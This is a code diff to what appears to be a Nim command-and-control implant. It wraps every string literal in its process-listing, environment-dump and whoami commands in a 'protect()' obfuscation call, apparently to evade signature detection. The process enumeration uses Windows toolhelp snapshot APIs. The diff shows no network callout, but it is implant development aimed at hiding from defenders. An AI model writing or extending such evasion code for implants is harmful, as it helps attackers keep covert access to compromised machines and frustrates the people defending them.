@@ -1,4 +1,4 @@
-import ../common/types
+import ../common/[types, utils]
 
 # Declare function prototypes
 proc executePs(ctx: AgentCtx, task: Task): TaskResult
@@ -8,26 +8,26 @@ proc executeWhoami(ctx: AgentCtx, task: Task): TaskResult
 # Command definitions
 let commands*: seq[Command] = @[
     Command(
-        name: "ps",
+        name: protect("ps"),
         commandType: CMD_PS,
-        description: "Display running processes.",
-        example: "ps",
+        description: protect("Display running processes."),
+        example: protect("ps"),
         arguments: @[],
         execute: executePs
     ),
     Command(
-        name: "env",
+        name: protect("env"),
         commandType: CMD_ENV,
-        description: "Display environment variables.",
-        example: "env",
+        description: protect("Display environment variables."),
+        example: protect("env"),
         arguments: @[],
         execute: executeEnv
     ),
     Command(
-        name: "whoami",
+        name: protect("whoami"),
         commandType: CMD_WHOAMI,
-        description: "Get user information.",
-        example: "whoami",
+        description: protect("Get user information."),
+        example: protect("whoami"),
         arguments: @[],
         execute: executeWhoami
     )
@@ -56,7 +56,7 @@ when defined(agent):
 
     proc executePs(ctx: AgentCtx, task: Task): TaskResult = 
         
-        echo fmt"   [>] Listing running processes."
+        echo protect("   [>] Listing running processes.")
         
         try: 
             var processes: seq[DWORD] = @[]
@@ -66,7 +66,7 @@ when defined(agent):
             # Take a snapshot of running processes
             let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
             if hSnapshot == INVALID_HANDLE_VALUE: 
-                raise newException(CatchableError, "Invalid permissions.\n")
+                raise newException(CatchableError, protect("Invalid permissions.\n"))
             
             # Close handle after object is no longer used
             defer: CloseHandle(hSnapshot)
@@ -76,7 +76,7 @@ when defined(agent):
 
             # Loop over processes to fill the map            
             if Process32First(hSnapshot, addr pe32) == FALSE:
-                raise newException(CatchableError, "Failed to get processes.\n")
+                raise newException(CatchableError, protect("Failed to get processes.\n"))
             
             while true: 
                 var procInfo = ProcessInfo(
@@ -99,7 +99,7 @@ when defined(agent):
                     processes.add(pid)
 
             # Add header row
-            let headers = @["PID", "PPID", "Process"]
+            let headers = @[protect("PID"), protect("PPID"), protect("Process")]
             output &= fmt"{headers[0]:<10}{headers[1]:<10}{headers[2]:<25}" & "\n"
             output &= "-".repeat(len(headers[0])).alignLeft(10) & "-".repeat(len(headers[1])).alignLeft(10) & "-".repeat(len(headers[2])).alignLeft(25) & "\n"
 
@@ -130,7 +130,7 @@ when defined(agent):
 
     proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = 
 
-        echo fmt"   [>] Displaying environment variables."
+        echo protect("   [>] Displaying environment variables.")
 
         try: 
             var output: string = ""
@@ -144,11 +144,11 @@ when defined(agent):
 
     proc executeWhoami(ctx: AgentCtx, task: Task): TaskResult = 
 
-        echo fmt"   [>] Getting user information."
+        echo protect("   [>] Getting user information.") 
 
         try: 
 
-            let output = "Not implemented"
+            let output = protect("Not implemented") 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(output))
 
         except CatchableError as err: 
